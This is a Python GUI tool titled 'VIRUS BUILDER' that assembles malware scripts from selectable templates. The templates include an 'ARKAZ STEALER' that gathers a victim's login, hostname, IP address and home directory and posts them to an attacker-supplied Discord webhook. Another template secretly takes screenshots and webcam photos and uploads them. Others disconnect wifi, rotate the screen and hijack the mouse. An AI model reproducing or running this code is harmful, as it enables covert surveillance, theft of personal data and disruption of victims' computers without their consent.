import tkinter as tk
import customtkinter as ctk

def builder():
    webhook = entry1.get()
    systeminfo = f"""import platform
import os
import socket
import requests
from datetime import datetime

WEBHOOK_URL = "{webhook}"

def grab_info():
    uname_info = platform.uname()
    system_platform = platform.system()
    path = os.path.expanduser('~')
    login1 = os.getlogin()
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return {{
        "Platform": system_platform,
        "User Login": login1,
        "Hostname": hostname,
        "IP Address": ip_address,
        "Home Directory": path,
        "System Version": uname_info.version,
        "Architecture": uname_info.machine,
        "Processor": uname_info.processor
    }}

    
def webhooksend():
    system_info = grab_info()

    embed = {{
        "embeds": [
            {{
                "color": 3066993,  
                "footer": {{"text": "ARKAZ STEALER", "icon_url": "https://i0.wp.com/metagalaxia.com.br/wp-content/uploads/2021/02/o-que-e-ahegao-1.webp?fit=462%2C407&ssl=1"}},
                "fields": [
                    {{"name": "Platform :", "value": system_info["Platform"], "inline": False}},
                    {{"name": "User Login :", "value": system_info["User Login"], "inline": False}},
                    {{"name": "Hostname :", "value": system_info["Hostname"], "inline": False}},
                    {{"name": "IP Address :", "value": system_info["IP Address"], "inline": False}},
                    {{"name": "Home Directory :", "value": system_info["Home Directory"], "inline": False}},
                    {{"name": "System Version :", "value": system_info["System Version"], "inline": False}},
                    {{"name": "Architecture :", "value": system_info["Architecture"], "inline": False}},
                    {{"name": "Processor :", "value": system_info["Processor"], "inline": False}},
                ]
            }}
        ]
    }}

    requests.post(WEBHOOK_URL, json=embed)

webhooksend()
 # type: ignore


"""
    randommouse = """def random():
    import random
    import pyautogui

    mouve = random.randint(0, 500)
    for i in range(5):
        pyautogui.moveTo(mouve, mouve, duration=2, tween=pyautogui.easeInOutQuad)  

random()
    
    """
    wifideco = """def wifideco():
    import os
    os.system("netsh wlan disconnect")

wifideco()

"""
    rotate = """def rotatescreen():
    import time , rotatescreen as rs
    pd = rs.get_primary_display()
    pd.rotate_to
    liste = [90, 180, 270, 0]

    for i in range (100):
        for x in liste:
            pd.rotate_to(x)
            time.sleep(0.5)

rotatescreen()

"""

    screenwebcam = f"""import pyautogui
import cv2
import numpy as np
import requests
import time
import os


WEBHOOK_URL = "{webhook}"


def capture_screen():
    screenshot = pyautogui.screenshot() 
    screenshot.save("screen.png")  
    return "screen.png"


def capture_webcam():
    cap = cv2.VideoCapture(0)  
    ret, frame = cap.read()  
    if ret:
        cv2.imwrite("webcam.png", frame)  
    cap.release()  
    return "webcam.png"

def send_to_discord(image_path):
    with open(image_path, "rb") as f:
        payload = {{
            "content": "# ARKAZ STEALER" 
        }}
        files = {{
            "file": f
        }}
        response = requests.post(WEBHOOK_URL, data=payload, files=files) 



def capture_and_send():
    screen_image = capture_screen()  
    webcam_image = capture_webcam() 
    

    send_to_discord(screen_image)
    time.sleep(1)  
    send_to_discord(webcam_image)


capture_and_send()


"""
    selected_options = []
    
    if var_option1.get():
        selected_options.append(systeminfo)
    if var_option2.get():
        selected_options.append(randommouse)
    if var_option3.get():
        selected_options.append(rotate)
    if var_option4.get():
        selected_options.append(screenwebcam)
    if var_option5.get():
        selected_options.append(wifideco)
    
    name = entry2.get()

    with open(f"{name}.py", "w") as file:
        for option in selected_options:
            file.write(option + "\n")

root = ctk.CTk()
root.title("VIRUS BUILDER - AKR")
root.geometry("500x500")
ctk.set_appearance_mode("dark")


root.configure(bg='#2c2f38')

label = ctk.CTkLabel(root, text="VIRUS BUILDER ", 
                     font=("Arial", 30, "bold"),  
                     text_color="#8B0000")    
label.pack(pady=20)

var_option1 = tk.BooleanVar()
var_option2 = tk.BooleanVar()
var_option3 = tk.BooleanVar()
var_option4 = tk.BooleanVar()
var_option5 = tk.BooleanVar()

checkbox_option1 = ctk.CTkCheckBox(root, text="System info", variable=var_option1,
                                  text_color="#8B0000", fg_color="#4e4e4e", border_color="#8B0000", hover_color="#8B0000")
checkbox_option1.pack(pady=10)

checkbox_option2 = ctk.CTkCheckBox(root, text="Random mouse", variable=var_option2,
                                  text_color="#8B0000", fg_color="#4e4e4e", border_color="#8B0000", hover_color="#8B0000")
checkbox_option2.pack(pady=10)

checkbox_option3 = ctk.CTkCheckBox(root, text="Rotate screen", variable=var_option3,
                                  text_color="#8B0000", fg_color="#4e4e4e", border_color="#8B0000", hover_color="#8B0000")
checkbox_option3.pack(pady=10)

checkbox_option4 = ctk.CTkCheckBox(root, text="Screenshot and webcam", variable=var_option4,
                                  text_color="#8B0000", fg_color="#4e4e4e", border_color="#8B0000", hover_color="#8B0000")
checkbox_option4.pack(pady=10)

checkbox_option5 = ctk.CTkCheckBox(root, text="Disconnect wifi", variable=var_option5,
                                  text_color="#8B0000", fg_color="#4e4e4e", border_color="#8B0000", hover_color="#8B0000")
checkbox_option5.pack(pady=10)


entry1 = ctk.CTkEntry(root, placeholder_text="Webhook",
                      text_color="#8B0000", fg_color="#4e4e4e", border_color="#8B0000", placeholder_text_color="#b3b3b3")
entry1.pack(padx=20, pady=20)

entry2 = ctk.CTkEntry(root, placeholder_text="Name",
                      text_color="#8B0000", fg_color="#4e4e4e", border_color="#8B0000", placeholder_text_color="#b3b3b3")
entry2.pack(padx=20, pady=20)


buttonbuild = ctk.CTkButton(root, text="BUILD", command=builder, text_color="white", fg_color="#8B0000", hover_color="#8B0000")
buttonbuild.pack(pady=10)

label_message = ctk.CTkLabel(root, text="", text_color="#ff4d4d", bg_color="#2c2f38")
label_message.pack(pady=5)

root.mainloop()